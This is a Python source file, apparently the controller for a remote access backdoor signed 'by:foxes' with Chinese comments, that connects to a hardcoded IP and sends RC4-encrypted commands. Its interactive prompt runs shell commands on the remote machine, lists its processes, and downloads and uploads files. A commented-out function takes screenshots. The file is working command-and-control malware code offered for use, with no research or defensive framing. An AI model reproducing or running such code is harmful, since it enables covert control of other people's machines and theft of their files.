import socket
import time
import subprocess
import os
# from PIL import ImageGrab
key ='qazwsxedqazwsxed'

def rc4_setup(key):
    if isinstance(key,str):
        key = key.encode()
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key [i % len(key)]) % 256
        s[i],s[j] = s[j],s[i]
    return s
def rc4_crypt(data,key):
    if isinstance(data,str):
        data = data.encode()
    s = rc4_setup(key)
    i, j = 0, 0
    res = []
    for byte in data:
        i =(i +1)%256
        j =(j+s[i])%256
        s[i],s[j]=s[j],s[i]
        res.append(byte^s[(s[i]+ s[j])%256])

    # print("加解密后长度:",len(res))
    return bytes(res)

def Rc4_Encrypt(data,key):
    # print("加密前长度:",len(data))
    return rc4_crypt(data,key)
def Rc4_Decrypt(data,key):
    # print("解密前长度:",len(data))
    return rc4_crypt(data,key)



def send_command_or_heartbeat(server_host, server_port):
    # 创建一个socket连接
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            # 尝试连接服务器
            client_socket.connect((server_host, server_port))
            print("Connected to server.")

            # 连接成功后打印帮助信息
            print("by:foxes 输入help查看帮助")

            # 连接成功后进入循环发送命令或心跳
            while True:
                command = input("fox > ").strip()
                if command:
                    if command == 'help':
                        print_help()
                    elif command == 'shell':
                        execute_shell_command(client_socket)
                    elif command == 'w':
                        list_processes(client_socket)
                    elif command == 'do':
                        download_file(client_socket)
                    elif command == 'du':
                        upload_file(client_socket)
                    # elif command == 'xs':
                    #     take_screenshot(client_socket)
                    else:
                        client_socket.sendall(Rc4_Encrypt(command.encode('utf-8'), key))
                        result = client_socket.recv(1000000)#.decode('utf-8', 'ignore')
                        result =Rc4_Decrypt(result, key).decode('utf-8', 'ignore')
                        print(result)
                else:
                    client_socket.sendall(Rc4_Encrypt(b'Heartbeat', key))

                # 每隔一段时间发送心跳包
                time.sleep(5)

        except (ConnectionResetError, ConnectionAbortedError, ConnectionRefusedError) as e:
            # 连接错误，打印错误信息并重试连接
            print(f"Connection error: {e}. Reconnecting...")
            client_socket.close()
            # 等待一会儿再重试连接，避免频繁重连
            time.sleep(5)

        except Exception as e:
            # 捕获其他异常，打印错误信息并关闭socket
            print(f"Unexpected error: {e}")
            client_socket.close()
            break


def print_help():
    print("Available commands:")
    print("  help    - 显示此帮助消息")
    print("  shell   - 在服务器上执行 shell 命令")
    print("  w       - 列出服务器上正在运行的进程")
    print(
        "  do      - 从服务器下载文件,你需要指定服务器上的文件路径和要保存的本地路径。如do /path/to/remote/file /local/path/to/save")
    print(
        "  du      - 将文件上传到服务器，需要指定本地文件路径和服务器上的保存路径。如du /local/path/to/file /path/to/remote/save")
    # print("  xs      - 截屏并保存到服务器，你需要指定保存路径。如xs /path/to/remote/save")


def execute_shell_command(client_socket):
    command = input("Shell command: ").strip()
    client_socket.sendall(Rc4_Encrypt(f"shell {command}".encode('utf-8'),key))
    result = client_socket.recv(1000000)#.decode('utf-8', 'ignore')
    result = Rc4_Decrypt(result, key).decode('utf-8', 'ignore')
    print(result)


def list_processes(client_socket):
    client_socket.sendall(Rc4_Encrypt(b"w",key))
    result = client_socket.recv(1000000)#.decode('utf-8', 'ignore')
    result = Rc4_Decrypt(result,key).decode('utf-8', 'ignore')
    print(result)


def download_file(client_socket):
    file_name = input("Enter the file name to download: ").strip()
    client_socket.sendall(Rc4_Encrypt(f"do {file_name}".encode('utf-8'),key))
    with open(file_name, 'wb') as file:
        while True:
            data = client_socket.recv(1000000)
            if not data:
                break
            file.write(Rc4_Decrypt(data,key))
    print(f"Downloaded file {file_name}")


def upload_file(client_socket):
    file_name = input("Enter the file name to upload: ").strip()
    if os.path.isfile(file_name):
        client_socket.sendall(Rc4_Encrypt(f"du {file_name}".encode('utf-8'),key))
        with open(file_name, 'rb') as file:
            while True:
                data = file.read(1000000)
                if not data:
                    break
                client_socket.sendall(Rc4_Encrypt(data,key))
        print(f"Uploaded file {file_name}")
    else:
        print(f"File {file_name} not found.")


# def take_screenshot(client_socket):
#     screenshot = ImageGrab.grab()
#     file_name = "screenshot.png"
#     screenshot.save(file_name, "PNG")
#     client_socket.sendall(f"xs {file_name}".encode('utf-8'))
#     with open(file_name, 'rb') as file:
#         while True:
#             data = file.read(1000000)
#             if not data:
#                 break
#             client_socket.sendall(data)
#     print("Screenshot saved and sent to server.")
#     os.remove(file_name)  # 删除本地截图文件


if __name__ == '__main__':
    server_host = '192.168.230.101'  # 替换为你的服务器IP
    server_port = 12345
    send_command_or_heartbeat(server_host, server_port)